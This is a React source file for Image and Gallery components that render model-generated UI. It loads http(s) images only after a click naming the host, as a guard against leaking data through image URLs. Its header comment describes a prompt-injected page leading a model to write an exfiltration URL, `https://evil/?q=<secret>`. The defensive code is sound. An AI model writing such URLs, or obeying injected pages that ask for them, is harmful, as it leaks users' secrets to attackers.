/**
 * An image. Remote images are the one thing in this library that would reach
 * the network, and a URL the model writes can carry whatever the thread has read
 * (a prompt-injected page asking for `https://evil/?q=<secret>`). So a `data:`
 * image draws at once and an `http(s)` one waits behind a click that names its
 * host — the reader's consent is the fetch. Anything else is not drawn.
 *
 * `Gallery` is the same slide repeated in a carousel, so it draws through
 * `GeneratedImage` too and the rule cannot drift between the two.
 */
import { useState } from "react"
import { z } from "zod/v4"
import { defineComponent } from "@openuidev/react-lang"
import { cn } from "@/lib/utils"
import { Empty } from "@/components/empty"
import { Carousel, CarouselContent, CarouselItem, CarouselNext, CarouselPrevious } from "@/components/ui/carousel"
import { BODY, Box, META, PAD, PAD_ROW } from "@/lib/openui/kit"

/** What an `src` is: a `data:` image (drawn at once) or an http(s) host (drawn on a click). */
export function imageSource(src: string) {
  const inline = /^data:image\/(png|jpe?g|gif|webp);/i.test(src)
  let host: string | null = null
  try {
    const url = new URL(src)
    if (url.protocol === "https:" || url.protocol === "http:") host = url.host
  } catch {
    /* not a URL — drawn as the alt text below */
  }
  return { inline, host }
}

export function GeneratedImage({ src, alt, caption }: { src: string; alt: string; caption?: string }) {
  const { inline, host } = imageSource(src)
  const [shown, setShown] = useState(inline)
  const [failed, setFailed] = useState(false)
  if (failed || (!shown && !host)) {
    return <Empty size="sm">{failed ? `Image failed to load: ${alt}` : alt}</Empty>
  }
  return (
    <Box>
      <figure className="min-w-0">
        {shown ? (
          <img
            src={src}
            alt={alt}
            referrerPolicy="no-referrer"
            onError={() => setFailed(true)}
            className="mx-auto block max-h-96 max-w-full object-contain"
          />
        ) : (
          <button
            type="button"
            onClick={() => setShown(true)}
            className={cn(
              "flex w-full flex-col items-start gap-0.5 text-start outline-none hover:bg-muted/60 focus-visible:ring-[3px] focus-visible:ring-ring/50 focus-visible:ring-inset",
              PAD
            )}
          >
            <span className={cn(BODY, "[overflow-wrap:anywhere]")}>{alt}</span>
            <span className={cn(META, "[overflow-wrap:anywhere]")}>Load image from {host}</span>
          </button>
        )}
        {caption && (
          <figcaption className={cn(META, "border-t border-border/70 text-pretty", PAD_ROW)}>{caption}</figcaption>
        )}
      </figure>
    </Box>
  )
}

export const Image = defineComponent({
  name: "Image",
  description: "An image from an https or data: URL, with alt text and an optional caption.",
  props: z.object({
    src: z.string(),
    alt: z.string(),
    caption: z.string().optional(),
  }),
  component: ({ props }) => <GeneratedImage {...props} />,
})

/** Several images, one at a time. The arrows sit inside the frame, which a
    transcript column has room for and shadcn's `-left-12` does not. */
export const Gallery = defineComponent({
  name: "Gallery",
  description: "A carousel of images, each with src, alt and optional caption.",
  props: z.object({
    images: z.array(z.object({ src: z.string(), alt: z.string(), caption: z.string().optional() })),
  }),
  component: ({ props }) => (
    <Carousel className="w-full min-w-0">
      <CarouselContent>
        {props.images.map((image, index) => (
          <CarouselItem key={index}>
            <GeneratedImage {...image} />
          </CarouselItem>
        ))}
      </CarouselContent>
      {props.images.length > 1 && (
        <>
          <CarouselPrevious className="left-2" />
          <CarouselNext className="right-2" />
        </>
      )}
    </Carousel>
  ),
})
